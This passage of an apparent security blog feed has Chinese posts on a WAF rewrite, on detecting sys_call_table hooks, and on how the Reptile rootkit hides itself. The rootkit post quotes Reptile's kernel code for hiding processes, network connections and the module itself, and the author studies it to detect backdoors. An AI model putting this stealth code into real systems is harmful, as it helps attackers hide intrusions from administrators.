   counter = 1                end                if counter &gt; value then                    ngx.exit(xxx)                    log...                ...            elseif field == \"cookie\" then                ...            elseif field == \"header\" then                ...            elseif field == \"arg\" then                ...其余限流部分可以自己实现，和 IP 部分代码类似其余其余则为灰度，版本控制，规则更新等Flink  待更新…",
            "content_html": "<h2 id=\"背景\">背景</h2><p>爬虫越来越多，峰值流量越来越高，非标应用难以维护等，对于 WAF 产生了挑战。通过 WAF 重构，减轻历史负担，承担更多安全场景</p><h2 id=\"需求\">需求</h2><ul>  <li>性能上提升</li>  <li>能够更好地处理大流量场景</li>  <li>更加合理标准化的架构方案</li>  <li>函数级别的灰度控制能力</li></ul><h2 id=\"设计\">设计</h2><p>本身谈不上大的改动或者设计，因为 WAF 升级过程中需要同时兼容两个版本，没有做很大变更，大致如下。原先 WAF 大致如下</p><p><img src=\"https://chriskaliX.github.io/assets/imgs/waf-old.png\" alt=\"WAF-OLD\" /></p><h3 id=\"实际遇到的问题\">实际遇到的问题</h3><p><strong>Redis</strong></p><blockquote>  <p>Redis 负责规则/开关的存储，由 WAF-admin 控制同步</p></blockquote><p>Nginx-Lua 部分需要和 Redis/WAF-admin 通讯（storm 为 filebeat 同步计算）。而问题则是 Redis 因为历史原因通过 IP 连接单库，虽然有从库，仍然有风险造成类似单点故障的问题。</p><p><strong>Storm</strong></p><blockquote>  <p>Storm 为计频，满足实时计算的封禁需求</p></blockquote><p>为组内早先自己搭建，完全由自己维护。目前公司内部不再使用 storm 集群，即自维护的集群如果出现了主节点 down 等问题，一时间也无法完全恢复，同样容易造成单点故障问题</p><p><strong>WAF-admin</strong></p><blockquote>  <p>WAF-admin 是主控端，负责 Nginx-Lua 控制，数据对接处理等</p></blockquote><p>完全由 Python 编写，代码中有许多 Hardcode 的地方，无法 CI/CD 走标准发布。在特殊情况没法及时扩容等</p><p><strong>Others</strong></p><p>一些分布在机器上的定时任务，脚本，用于 WAF 的分析等，没有良好的备份/标准文档等</p><h3 id=\"改动\">改动</h3><blockquote>  <p>图中的 Redis 被移除，WAF-admin 重构为 Java（标准化，可以 CI/CD），Mysql 不再自己维护，Storm 全部重写为 Flink 并且满足新的需求</p></blockquote><p><img src=\"https://chriskaliX.github.io/assets/imgs/waf-new.png\" alt=\"WAF-NEW\" /></p><h2 id=\"具体细节\">具体细节</h2><blockquote>  <p>WAF 开发的具体笔记，仅记录重要部分</p></blockquote><h3 id=\"nginx-lua\">Nginx-Lua</h3><blockquote>  <p>公司的 WAF 直接以 Lua 的形式部署在 LB 之后的 Nginx 集群。通过伪代码的形式展示存在的问题和修复</p></blockquote><h4 id=\"错误的函数使用\">错误的函数使用</h4><p>入职接手之后，碰到过一个线上的问题。有一个接口，单独使用 ip + url 的形式无法封禁。经过排查，是一个很小的点。在 Nginx 中，某个 Server 配置如下</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>server {    ...    server_name xxx.test.com xxx1.test.com;    ...}</code></pre></div></div><p>而当时封禁函数使用的地址获取方式为</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>ngx.var.server_name .. ngx.var.uri</code></pre></div></div><p>其中 <code class=\"language-plaintext highlighter-rouge\">ngx.var.server_name</code> 默认获取 server_name 的第一个，早在 2015 年就有人提过这个<a href=\"https://github.com/openresty/openresty/issues/98\">问题</a>。<code class=\"language-plaintext highlighter-rouge\">ngx.var.server_name</code> 本身使用目的不是如此，而应该使用内置的 <code class=\"language-plaintext highlighter-rouge\">ngx.var.host</code> 来获取</p><h4 id=\"重复的字符操作\">重复的字符操作</h4><blockquote>  <p>在老版本的 Lua 中，经常能看到一些字符串的重复操作。常见的是：从 nginx 共享内存中读取规则，并且解析。伪代码如下</p></blockquote><div class=\"language-lua highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"nf\">demo_check</span><span class=\"p\">()</span>    <span class=\"kd\">local</span> <span class=\"n\">config</span> <span class=\"o\">=</span> <span class=\"n\">rules</span><span class=\"p\">:</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"s2\">\"demo\"</span><span class=\"p\">)</span>    <span class=\"k\">for</span> <span class=\"n\">_</span><span class=\"p\">,</span> <span class=\"n\">d</span> <span class=\"k\">in</span> <span class=\"nb\">pairs</span><span class=\"p\">(</span><span class=\"n\">split</span><span class=\"p\">(</span><span class=\"n\">config</span><span class=\"p\">),</span> <span class=\"s2\">\"!!!\"</span><span class=\"p\">)</span> <span class=\"k\">do</span>    <span class=\"o\">...</span></code></pre></div></div><p>这样的代码几乎出现在每个函数中，穿插在对应的 access 流程里。假设我们有 10 个 check 函数，那么每次请求我们都需要做 10 次无效的字符串 split 操作。在后续的对比里，这段 split 所占的大约为 15 ～ 20%</p><p>如何解决这个问题? 很尴尬的是，这个 WAF 代码原先并无引入 worker，没有缓存的功能。大致为，在 nginx 的 init_worker 阶段引入 worker 文件，做秒级的规则 pull 和解析。代码也很简单，写好函数，定时调用即可</p><p><strong>Segfault</strong></p><blockquote>  <p>当我开心的写完，引入这个文件之后，我们发现在一些测试机器上会出现 segment fault 的问题，我们 dump 下这个文件，稍微看了一下。</p></blockquote><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>gdb &lt;nginx&gt; core&gt; (gdb) bt`text`#0 ... in ngx_http_core_create_srv_conf()#1 ... in ngx_http_lua_init_worker()#2 ... in ngx_worker_process_init()...</code></pre></div></div><p>大致可以看出跟我们引入的 init_worker 文件相关，函数定位在 <code class=\"language-plaintext highlighter-rouge\">ngx_http_core_create_srv_conf</code>。通过查询，我们看到有一个类似 <a href=\"https://github.com/openresty/lua-nginx-module/issues/1348\">issue</a>。大致原因为：当 nginx 版本 &gt;= 1.15.0 且 lua-nginx-module 组件 &lt;= 0.10.14 时会出现这个问题。</p><p>这种往往是在后期测试时发现，能搜到的只有官方的特殊 issue。同时对于 WAF 这种影响面很大的，上线发布等要有合理的测试、灰度等发现这类比较隐蔽的问题</p><p><strong>多次字符拼接</strong></p><p>在原先 Log 日志打印部分，能看到类似以下代码</p><div class=\"language-lua highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kd\">local</span> <span class=\"n\">log</span> <span class=\"o\">=</span> <span class=\"n\">clientip</span> <span class=\"o\">..</span> <span class=\"s2\">\" [\"</span> <span class=\"o\">..</span> <span class=\"n\">time</span> <span class=\"o\">..</span> <span class=\"s2\">\" ]\"</span> <span class=\"o\">..</span> <span class=\"n\">method</span> <span class=\"o\">..</span> <span class=\"s2\">\" \"</span> <span class=\"o\">..</span> <span class=\"n\">ngx_method</span> <span class=\"o\">..</span> <span class=\"s2\">\" \"</span> <span class=\"o\">......</span></code></pre></div></div><p>有类似超 9 个字符串连续拼接的场景。在 Lua 中每次 .. 拼接意味着开辟新空间，产生拷贝。这种多次拼接的长字符串拼接，对性能会有较大的影响，会有频繁 GC 的风险。在新 WAF 中改为通过 table concat 的方式做拼接。</p><p>concat 函数本身不会有频繁申请拷贝的操作，而是当写满一个定长的 BUFFER 之后，才会生成一个 TString 做一次内存合并。在其他的一些简单场景，如单次使用 .. 进行拼接，则无需做修改。</p><p><strong>多维度限流</strong></p><blockquote>  <p>之前的限流完全依赖两个，一个是实时处理（Storm 根据日志计频），但是往往会有小的延时（例如 10 秒）；另一个就是单机器上的 URL 限流（兜底）。我们需要一个更为灵活的多维度限流</p></blockquote><p>调研之后，我们需要一种支持任意 Header 字段，Cookie 字段的限流，来满足一些活动场景下，大流量代拍、恶意刷取的场景。限流部分可以使用 lua-resty-limit-traffic，这种使用类似于匀速器，即如果设定 1 秒内限定 rate 100，则任意的 0.1 秒都是均匀的。由于引入组件还需要做稳定性测试，延长了整个项目的周期，所以决定直接用共享内存实现</p><p>伪代码如下:</p><div class=\"language-lua highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">function</span> <span class=\"nf\">advanced_cc_check</span><span class=\"p\">(</span><span class=\"n\">context</span><span class=\"p\">)</span>    <span class=\"o\">...</span>    <span class=\"k\">if</span> <span class=\"n\">advanced_cc_check</span> <span class=\"o\">==</span> <span class=\"s2\">\"on\"</span> <span class=\"k\">then</span>        <span class=\"n\">cache</span><span class=\"p\">:</span><span class=\"n\">flush_expired</span><span class=\"p\">()</span>        <span class=\"kd\">local</span> <span class=\"n\">rule</span> <span class=\"o\">=</span> <span class=\"n\">get_rule</span><span class=\"p\">(</span><span class=\"s2\">\"advanced_cc\"</span> <span class=\"o\">..</span> <span class=\"n\">context</span><span class=\"p\">.</span><span class=\"n\">uri</span><span class=\"p\">)</span>        <span class=\"k\">for</span> <span class=\"n\">field</span><span class=\"p\">,</span> <span class=\"n\">value</span> <span class=\"k\">in</span> <span class=\"nb\">pairs</span><span class=\"p\">(</span><span class=\"n\">rule</span><span class=\"p\">)</span> <span class=\"k\">do</span>            <span class=\"k\">if</span> <span class=\"n\">field</span> <span class=\"o\">==</span> <span class=\"s2\">\"ip\"</span> <span class=\"k\">then</span>                <span class=\"kd\">local</span> <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"s2\">\"advanced_cc\"</span> <span class=\"o\">..</span> <span class=\"n\">context</span><span class=\"p\">.</span><span class=\"n\">uriip</span>                <span class=\"kd\">local</span> <span class=\"n\">count</span> <span class=\"o\">=</span> <span class=\"n\">cache</span><span class=\"p\">:</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">)</span>                <span class=\"kd\">local</span> <span class=\"n\">counter</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>                <span class=\"k\">if</span> <span class=\"n\">count</span> <span class=\"k\">then</span>                    <span class=\"n\">counter</span> <span class=\"o\">=</span> <span class=\"n\">cache</span><span class=\"p\">:</span><span class=\"n\">incr</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">)</span>                <span class=\"k\">else</span>                    <span class=\"n\">cache</span><span class=\"p\">:</span><span class=\"n\">set</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">)</span>                    <span class=\"n\">counter</span> <span class=\"o\">=</span> <span class=\"mi\">1</span>                <span class=\"k\">end</span>                <span class=\"k\">if</span> <span class=\"n\">counter</span> <span class=\"o\">&gt;</span> <span class=\"n\">value</span> <span class=\"k\">then</span>                    <span class=\"n\">ngx</span><span class=\"p\">.</span><span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"n\">xxx</span><span class=\"p\">)</span>                    <span class=\"n\">log</span><span class=\"o\">...</span>                <span class=\"o\">...</span>            <span class=\"k\">elseif</span> <span class=\"n\">field</span> <span class=\"o\">==</span> <span class=\"s2\">\"cookie\"</span> <span class=\"k\">then</span>                <span class=\"o\">...</span>            <span class=\"k\">elseif</span> <span class=\"n\">field</span> <span class=\"o\">==</span> <span class=\"s2\">\"header\"</span> <span class=\"k\">then</span>                <span class=\"o\">...</span>            <span class=\"k\">elseif</span> <span class=\"n\">field</span> <span class=\"o\">==</span> <span class=\"s2\">\"arg\"</span> <span class=\"k\">then</span>                <span class=\"o\">...</span></code></pre></div></div><p>其余限流部分可以自己实现，和 IP 部分代码类似</p><p><strong>其余</strong></p><p>其余则为灰度，版本控制，规则更新等</p><h3 id=\"flink\">Flink</h3><blockquote>  <p>待更新…</p></blockquote>",
            "url": "https://chriskalix.github.io/2022/08/21/waf-dev",
            
            
            
            
            
            "date_published": "2022-08-21T00:00:00+02:00",
            "date_modified": "2022-08-21T00:00:00+02:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/05/18/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%89-rootkit%E9%9A%90%E8%97%8F",
            "title": "Linux Rootkit初窥(三)Rootkit隐藏",
            "summary": "Linux Rootkit初窥(三)Rootkit隐藏",
            "content_text": "背景一个良好的 Rootkit 除了有敲门，Hook以外，隐藏网络/进程/内核模块也是十分重要的，同时对于我们分析是否存在内核后门，也非常重要以下部分代码基于 Reptileproc 隐藏代码地址判断可见首先是入口地址，判断进程是否可见，再调用 flag_tasks 设置void hide_proc(pid_t pid){\tif (is_proc_invisible(pid))\t\tflag_tasks(pid, 0);\telse\t\tflag_tasks(pid, 1);}先看一下 is_proc_invisible 函数int is_proc_invisible(pid_t pid){\tstruct task_struct *task;\tint ret = 0;\tif (!pid)\t\treturn ret;\ttask = find_task(pid);\tif (!task)\t\treturn ret;\tif (is_task_invisible(task))\t\tret = 1;\tput_task_struct(task);\treturn ret;}...#define FLAG 0x80000000static inline int is_task_invisible(struct task_struct *task){\treturn task-&gt;flags &amp; FLAG;}主要判断 task-&gt;flags 一切围绕着这个展开，包括下面的进程隐藏。我对于 linux 内核并不熟悉，搜索学习了一下如下：进程标记task_struct 这个结构体，在 linux/sched.h 下，elixir对应的 flags 标识位如下所示:/* * Per process flags */#define PF_VCPU\t\t\t0x00000001\t/* I'm a virtual CPU */#define PF_IDLE\t\t\t0x00000002\t/* I am an IDLE thread */#define PF_EXITING\t\t0x00000004\t/* Getting shut down */#define PF_POSTCOREDUMP\t\t0x00000008\t/* Coredumps should ignore this task */#define PF_IO_WORKER\t\t0x00000010\t/* Task is an IO worker */#define PF_WQ_WORKER\t\t0x00000020\t/* I'm a workqueue worker */#define PF_FORKNOEXEC\t\t0x00000040\t/* Forked but didn't exec */#define PF_MCE_PROCESS\t\t0x00000080      /* Process policy on mce errors */#define PF_SUPERPRIV\t\t0x00000100\t/* Used super-user privileges */#define PF_DUMPCORE\t\t0x00000200\t/* Dumped core */#define PF_SIGNALED\t\t0x00000400\t/* Killed by a signal */#define PF_MEMALLOC\t\t0x00000800\t/* Allocating memory */#define PF_NPROC_EXCEEDED\t0x00001000\t/* set_user() noticed that RLIMIT_NPROC was exceeded */#define PF_USED_MATH\t\t0x00002000\t/* If unset the fpu must be initialized before use */#define PF_NOFREEZE\t\t0x00008000\t/* This thread should not be frozen */#define PF_FROZEN\t\t0x00010000\t/* Frozen for system suspend */#define PF_KSWAPD\t\t0x00020000\t/* I am kswapd */#define PF_MEMALLOC_NOFS\t0x00040000\t/* All allocation requests will inherit GFP_NOFS */#define PF_MEMALLOC_NOIO\t0x00080000\t/* All allocation requests will inherit GFP_NOIO */#define PF_LOCAL_THROTTLE\t0x00100000\t/* Throttle writes only against the bdi I write to,\t\t\t\t\t\t * I am cleaning dirty pages from some other bdi. */#define PF_KTHREAD\t\t0x00200000\t/* I am a kernel thread */#define PF_RANDOMIZE\t\t0x00400000\t/* Randomize virtual address space */#define PF_SWAPWRITE\t\t0x00800000\t/* Allowed to write to swap */#define PF_NO_SETAFFINITY\t0x04000000\t/* Userland is not allowed to meddle with cpus_mask */#define PF_MCE_EARLY\t\t0x08000000      /* Early kill for mce process policy */#define PF_MEMALLOC_PIN\t\t0x10000000\t/* Allocation context constrained to zones which allow long term pinning. */#define PF_FREEZER_SKIP\t\t0x40000000\t/* Freezer should not count it as freezable */#define PF_SUSPEND_TASK\t\t0x80000000      /* This thread called freeze_processes() and should not be frozen */在 Reptile 中，判断是否为 PF_SUSPEND_TASK. 在其他项目中，我们也能看到为 0x10000000 即 PF_MEMALLOC_PINnet 隐藏文件地址main.c在 main.c 中代码如下：/* ------------------------ HIDE CONNECTIONS ------------------------- */#ifdef CONFIG_HIDE_CONN#include &lt;net/inet_sock.h&gt;#include &lt;linux/seq_file.h&gt;#include \"network.h\"LIST_HEAD(hidden_conn_list);KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);static int khook_tcp4_seq_show(struct seq_file *seq, void *v){\tint ret;\tstruct sock *sk = v;\tstruct inet_sock *inet;\tstruct hidden_conn *hc;\tunsigned int daddr;\t//unsigned short dport;\tif (v == SEQ_START_TOKEN) {\t\tgoto origin;\t}\tinet = (struct inet_sock *)sk;#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(2, 6, 33)\tdaddr = inet-&gt;inet_daddr;\t//dport = inet-&gt;inet_dport;#else\tdaddr = inet-&gt;daddr;\t//dport = inet-&gt;dport;#endif\tlist_for_each_entry(hc, &amp;hidden_conn_list, list)\t{\t\tif (hc-&gt;addr.sin_addr.s_addr == daddr /* &amp;&amp; hc-&gt;addr.sin_port == dport */) {\t\t\tret = 0;\t\t\tgoto out;\t\t}\t}origin:\tret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);out:\treturn ret;}KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);static int khook_udp4_seq_show(struct seq_file *seq, void *v){\tint ret;\tstruct sock *sk = v;\tstruct inet_sock *inet;\tstruct hidden_conn *hc;\tunsigned int daddr;\t//unsigned short dport;\tif (v == SEQ_START_TOKEN) {\t\tgoto origin;\t}\tinet = (struct inet_sock *)sk;#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(2, 6, 33)\tdaddr = inet-&gt;inet_daddr;\t//dport = inet-&gt;inet_dport;#else\tdaddr = inet-&gt;daddr;\t//dport = inet-&gt;dport;#endif\tlist_for_each_entry(hc, &amp;hidden_conn_list, list)\t{\t\tif (hc-&gt;addr.sin_addr.s_addr == daddr /* &amp;&amp; hc-&gt;addr.sin_port == dport */) {\t\t\tret = 0;\t\t\tgoto out;\t\t}\t}origin:\tret = KHOOK_ORIGIN(udp4_seq_show, seq, v);out:\treturn ret;}#endif简单来说就是 hook 掉 tcp4_seq_show/udp4_seq_show 这两个展示网络接口。在函数 khook_inet_ioctl 分支 4 获取来判断是否隐藏module 隐藏首先 module 的获取是, /proc/modules 以及 lsmod ，在 Reptile 中是将自身从内核模块链表中删除。代码很简单，具体原理放后面再深入void hide(void){\twhile (!mutex_trylock(&amp;module_mutex))\t\tcpu_relax();\tmod_list = THIS_MODULE-&gt;list.prev;\tlist_del(&amp;THIS_MODULE-&gt;list);\tkfree(THIS_MODULE-&gt;sect_attrs);\tTHIS_MODULE-&gt;sect_attrs = NULL;\tmutex_unlock(&amp;module_mutex);\t\thide_m = 1;}Unfishied  稍微流水账的记录了一下… 因为急于看 cilium 的 tetragon…",
            "content_html": "<h2 id=\"背景\">背景</h2><p>一个良好的 Rootkit 除了有敲门，Hook以外，隐藏网络/进程/内核模块也是十分重要的，同时对于我们分析是否存在内核后门，也非常重要</p><p>以下部分代码基于 <a href=\"https://github.com/f0rb1dd3n/Reptile\">Reptile</a></p><h2 id=\"proc-隐藏\">proc 隐藏</h2><p><a href=\"https://github.com/f0rb1dd3n/Reptile/blob/master/kernel/proc.c\">代码地址</a></p><h3 id=\"判断可见\">判断可见</h3><p>首先是入口地址，判断进程是否可见，再调用 <code class=\"language-plaintext highlighter-rouge\">flag_tasks</code> 设置</p><pre><code class=\"language-C\">void hide_proc(pid_t pid){\tif (is_proc_invisible(pid))\t\tflag_tasks(pid, 0);\telse\t\tflag_tasks(pid, 1);}</code></pre><p>先看一下 <code class=\"language-plaintext highlighter-rouge\">is_proc_invisible</code> 函数</p><pre><code class=\"language-C\">int is_proc_invisible(pid_t pid){\tstruct task_struct *task;\tint ret = 0;\tif (!pid)\t\treturn ret;\ttask = find_task(pid);\tif (!task)\t\treturn ret;\tif (is_task_invisible(task))\t\tret = 1;\tput_task_struct(task);\treturn ret;}...#define FLAG 0x80000000static inline int is_task_invisible(struct task_struct *task){\treturn task-&gt;flags &amp; FLAG;}</code></pre><p>主要判断 <code class=\"language-plaintext highlighter-rouge\">task-&gt;flags</code> 一切围绕着这个展开，包括下面的进程隐藏。我对于 linux 内核并不熟悉，搜索学习了一下如下：</p><h3 id=\"进程标记\">进程标记</h3><p><code class=\"language-plaintext highlighter-rouge\">task_struct</code> 这个结构体，在 <code class=\"language-plaintext highlighter-rouge\">linux/sched.h</code> 下，<a href=\"https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L728\">elixir</a></p><p>对应的 <code class=\"language-plaintext highlighter-rouge\">flags</code> 标识位如下所示:</p><pre><code class=\"language-C\">/* * Per process flags */#define PF_VCPU\t\t\t0x00000001\t/* I'm a virtual CPU */#define PF_IDLE\t\t\t0x00000002\t/* I am an IDLE thread */#define PF_EXITING\t\t0x00000004\t/* Getting shut down */#define PF_POSTCOREDUMP\t\t0x00000008\t/* Coredumps should ignore this task */#define PF_IO_WORKER\t\t0x00000010\t/* Task is an IO worker */#define PF_WQ_WORKER\t\t0x00000020\t/* I'm a workqueue worker */#define PF_FORKNOEXEC\t\t0x00000040\t/* Forked but didn't exec */#define PF_MCE_PROCESS\t\t0x00000080      /* Process policy on mce errors */#define PF_SUPERPRIV\t\t0x00000100\t/* Used super-user privileges */#define PF_DUMPCORE\t\t0x00000200\t/* Dumped core */#define PF_SIGNALED\t\t0x00000400\t/* Killed by a signal */#define PF_MEMALLOC\t\t0x00000800\t/* Allocating memory */#define PF_NPROC_EXCEEDED\t0x00001000\t/* set_user() noticed that RLIMIT_NPROC was exceeded */#define PF_USED_MATH\t\t0x00002000\t/* If unset the fpu must be initialized before use */#define PF_NOFREEZE\t\t0x00008000\t/* This thread should not be frozen */#define PF_FROZEN\t\t0x00010000\t/* Frozen for system suspend */#define PF_KSWAPD\t\t0x00020000\t/* I am kswapd */#define PF_MEMALLOC_NOFS\t0x00040000\t/* All allocation requests will inherit GFP_NOFS */#define PF_MEMALLOC_NOIO\t0x00080000\t/* All allocation requests will inherit GFP_NOIO */#define PF_LOCAL_THROTTLE\t0x00100000\t/* Throttle writes only against the bdi I write to,\t\t\t\t\t\t * I am cleaning dirty pages from some other bdi. */#define PF_KTHREAD\t\t0x00200000\t/* I am a kernel thread */#define PF_RANDOMIZE\t\t0x00400000\t/* Randomize virtual address space */#define PF_SWAPWRITE\t\t0x00800000\t/* Allowed to write to swap */#define PF_NO_SETAFFINITY\t0x04000000\t/* Userland is not allowed to meddle with cpus_mask */#define PF_MCE_EARLY\t\t0x08000000      /* Early kill for mce process policy */#define PF_MEMALLOC_PIN\t\t0x10000000\t/* Allocation context constrained to zones which allow long term pinning. */#define PF_FREEZER_SKIP\t\t0x40000000\t/* Freezer should not count it as freezable */#define PF_SUSPEND_TASK\t\t0x80000000      /* This thread called freeze_processes() and should not be frozen */</code></pre><p>在 <code class=\"language-plaintext highlighter-rouge\">Reptile</code> 中，判断是否为 <code class=\"language-plaintext highlighter-rouge\">PF_SUSPEND_TASK</code>. 在<a href=\"https://github.com/seal9055/cyber_attack_simulation/blob/7aff159017ce013fca6b59dd687e221251d57100/rootkit/rootkit.c\">其他项目</a>中，我们也能看到为 <code class=\"language-plaintext highlighter-rouge\">0x10000000</code> 即 <code class=\"language-plaintext highlighter-rouge\">PF_MEMALLOC_PIN</code></p><h2 id=\"net-隐藏\">net 隐藏</h2><p><a href=\"https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/kernel/network.c\">文件地址</a><a href=\"https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/kernel/main.c\">main.c</a></p><p>在 <code class=\"language-plaintext highlighter-rouge\">main.c</code> 中代码如下：</p><pre><code class=\"language-C\">/* ------------------------ HIDE CONNECTIONS ------------------------- */#ifdef CONFIG_HIDE_CONN#include &lt;net/inet_sock.h&gt;#include &lt;linux/seq_file.h&gt;#include \"network.h\"LIST_HEAD(hidden_conn_list);KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);static int khook_tcp4_seq_show(struct seq_file *seq, void *v){\tint ret;\tstruct sock *sk = v;\tstruct inet_sock *inet;\tstruct hidden_conn *hc;\tunsigned int daddr;\t//unsigned short dport;\tif (v == SEQ_START_TOKEN) {\t\tgoto origin;\t}\tinet = (struct inet_sock *)sk;#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(2, 6, 33)\tdaddr = inet-&gt;inet_daddr;\t//dport = inet-&gt;inet_dport;#else\tdaddr = inet-&gt;daddr;\t//dport = inet-&gt;dport;#endif\tlist_for_each_entry(hc, &amp;hidden_conn_list, list)\t{\t\tif (hc-&gt;addr.sin_addr.s_addr == daddr /* &amp;&amp; hc-&gt;addr.sin_port == dport */) {\t\t\tret = 0;\t\t\tgoto out;\t\t}\t}origin:\tret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);out:\treturn ret;}KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);static int khook_udp4_seq_show(struct seq_file *seq, void *v){\tint ret;\tstruct sock *sk = v;\tstruct inet_sock *inet;\tstruct hidden_conn *hc;\tunsigned int daddr;\t//unsigned short dport;\tif (v == SEQ_START_TOKEN) {\t\tgoto origin;\t}\tinet = (struct inet_sock *)sk;#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(2, 6, 33)\tdaddr = inet-&gt;inet_daddr;\t//dport = inet-&gt;inet_dport;#else\tdaddr = inet-&gt;daddr;\t//dport = inet-&gt;dport;#endif\tlist_for_each_entry(hc, &amp;hidden_conn_list, list)\t{\t\tif (hc-&gt;addr.sin_addr.s_addr == daddr /* &amp;&amp; hc-&gt;addr.sin_port == dport */) {\t\t\tret = 0;\t\t\tgoto out;\t\t}\t}origin:\tret = KHOOK_ORIGIN(udp4_seq_show, seq, v);out:\treturn ret;}#endif</code></pre><p>简单来说就是 hook 掉 <code class=\"language-plaintext highlighter-rouge\">tcp4_seq_show/udp4_seq_show</code> 这两个展示网络接口。在函数 <code class=\"language-plaintext highlighter-rouge\">khook_inet_ioctl</code> 分支 4 获取来判断是否隐藏</p><h3 id=\"module-隐藏\">module 隐藏</h3><p>首先 module 的获取是, <code class=\"language-plaintext highlighter-rouge\">/proc/modules</code> 以及 <code class=\"language-plaintext highlighter-rouge\">lsmod</code> ，在 <code class=\"language-plaintext highlighter-rouge\">Reptile</code> 中是将自身从内核模块链表中删除。代码很简单，具体原理放后面再深入</p><pre><code class=\"language-C\">void hide(void){\twhile (!mutex_trylock(&amp;module_mutex))\t\tcpu_relax();\tmod_list = THIS_MODULE-&gt;list.prev;\tlist_del(&amp;THIS_MODULE-&gt;list);\tkfree(THIS_MODULE-&gt;sect_attrs);\tTHIS_MODULE-&gt;sect_attrs = NULL;\tmutex_unlock(&amp;module_mutex);\t\thide_m = 1;}</code></pre><h3 id=\"unfishied\">Unfishied</h3><blockquote>  <p>稍微流水账的记录了一下… 因为急于看 cilium 的 tetragon…</p></blockquote>",
            "url": "https://chriskalix.github.io/2022/05/18/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%B8%89-rootkit%E9%9A%90%E8%97%8F",
            
            
            
            
            
            "date_published": "2022-05-18T00:00:00+02:00",
            "date_modified": "2022-05-18T00:00:00+02:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/03/21/linux-rootkit%E5%88%9D%E7%AA%A5-%E4%BA%8C-sys-call-table",
            "title": "Linux Rootkit初窥(二)sys_call_table",
            "summary": "Linux Rootkit初窥(二)sys_call_table",
            "content_text": "背景书接上回，我们对 sys_call_table 继续探究，开篇之前还是先贴一下这个图片。以下代码基于 Kernel Version 4.18基础知识首先我们了解一下，sys_call_table 在 Linux Source Code 中是怎么样的。在 arch/x86/entry/syscall_64.c 中如下extern asmlinkage long sys_ni_syscall(const struct pt_regs *);#define __SYSCALL_64(nr, sym, qual) extern asmlinkage long sym(const struct pt_regs *);#include &lt;asm/syscalls_64.h&gt;#undef __SYSCALL_64#define __SYSCALL_64(nr, sym, qual) [nr] = sym,asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {    /*     * Smells like a compiler bug -- it doesn't work     * when the &amp; below is removed.     */    [0 ... __NR_syscall_max] = &amp;sys_ni_syscall,#include &lt;asm/syscalls_64.h&gt;};用户态程序调用后进入到 Syscall 陷入中断，在 sys_call_table 中寻找对应处理程序。对于 sys_call_table 地址的获取在 Kernel Version 2.6 之后做了隐藏，可以参考这个文章。由于不讨论 Rootkit 具体细节（其实我还没看），仅从检测角度来说在 Elkeid 里的代码和 IDT 检测一样static void analyze_syscalls(void){    int i;    unsigned long addr;    struct module *mod;    if (!sct || !ckt)        return;            for (i = 0; i &lt; NR_syscalls; i++) {        const char *mod_name = \"-1\";        addr = sct[i];                if (!ckt(addr)) {            module_list_lock();            mod = get_module_from_addr(addr);            if (mod) {                mod_name = mod-&gt;name;            } else {                const char* name = find_hidden_module(addr);                if (IS_ERR_OR_NULL(name)) {                module_list_unlock();                continue;                }                mod_name = name;            }                        syscall_print(mod_name, i);            module_list_unlock();        }    }}通过遍历 kobj 判断是否在 kset 里面来判断是否是一个 hidden module。文章暂时属于未完成的状态，后续会有做 Rootkit 的部分在这里补全题外话今天公司的用户态 HIDS 上抓了一个入侵，很兴奋，很少抓到入侵:入侵的流程很简单，由于管理疏忽有一个 PHP 的应用存在 RCE，父进程为 php-fpm 的进程执行了 sh 触发了警告，后续就是问题处置让我更加明白了，用户态的代码可能和内核态的一样重要。对于绝大部分入侵场景来说，大部分都是在用户态层面的对抗。真正内核态的，可能是占较少部分。所以我一直认为，好的数据采集源是成功的50%，另外的50%在分析",
